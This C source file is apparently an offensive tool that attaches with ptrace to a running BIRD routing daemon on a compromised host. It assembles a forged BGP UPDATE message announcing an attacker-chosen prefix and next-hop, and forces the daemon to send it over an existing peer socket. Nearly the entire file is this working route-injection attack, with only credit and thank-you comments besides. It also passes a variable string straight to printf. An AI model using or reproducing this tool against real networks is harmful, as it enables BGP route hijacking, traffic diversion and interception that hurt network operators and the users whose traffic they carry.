#define _GNU_SOURCE

#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdio.h>


//credit to https://github.com/emptymonkey/ptrace_do.git
#include "ptrace_do/libptrace_do.h"

int convert(char* ip_address)
{
        char reversed_ip_address[INET_ADDRSTRLEN];

	in_addr_t address;

        //my c isn't that great, so thank you https://stackoverflow.com/questions/16373248/convert-ip-for-reverse-ip-lookup!

	inet_pton(AF_INET, ip_address, &address);
	address = ((address & 0xff000000) >> 24) | ((address & 0x00ff0000) >>  8) | ((address & 0x0000ff00) <<  8) | ((address & 0x000000ff) << 24);
	inet_ntop(AF_INET, &address, reversed_ip_address, sizeof(reversed_ip_address));
        return inet_addr(reversed_ip_address);
}

int main(int argc, char **argv)
{
	#define BBFF 107
        int pid;
        int fd;
        char *buffer;
        void *remote_addr;
        struct ptrace_do *target;

        if(argc != 5) 
        {
                fprintf(stderr, "usage: <Compromised Node IP> <IP to inject> <PID of Bird> <FD of the Node to inject to>\n");
                exit(-1);
        }

        int ip_address_node = convert(argv[1]);
        int ip_address_inject = convert(argv[2]);


	pid = strtol(argv[3],NULL,10);
        fd = strtol(argv[4],NULL,10);

        target = ptrace_do_init(pid);

        char *hexstr;
	hexstr  = (char *) ptrace_do_malloc(target, BBFF);
	memset(hexstr, 0, BBFF);

        char payload_one[] = "ffffffffffffffffffffffffffffffff0035020000001540010100400200400304";
        char payload_two[] = "400504000000640000000320";

        snprintf(hexstr, BBFF, "%s%08x%s%08x", payload_one, ip_address_node, payload_two, ip_address_inject);

        printf("Injecting the following payload ");
        printf(hexstr);
        printf(".\n");

        size_t len = strlen(hexstr);
        
        size_t final_len = len / 2;
        unsigned char* chrs = (unsigned char*) ptrace_do_malloc(target, (final_len+1) * sizeof(*chrs));
	memset(chrs, 0, final_len+1);
        for (size_t i=0, j=0; j<final_len; i+=2, j++){
                chrs[j] = (hexstr[i] % 32 + 9) % 25 * 16 + (hexstr[i+1] % 32 + 9) % 25;
	}

        remote_addr = ptrace_do_push_mem(target, chrs);

        ptrace_do_syscall(target, __NR_sendto, fd, remote_addr, 53, 0, 0, 0);
        ptrace_do_cleanup(target);
        return(0);
}

//thanks Reino for your help with this script, I am gonna go back to python now.
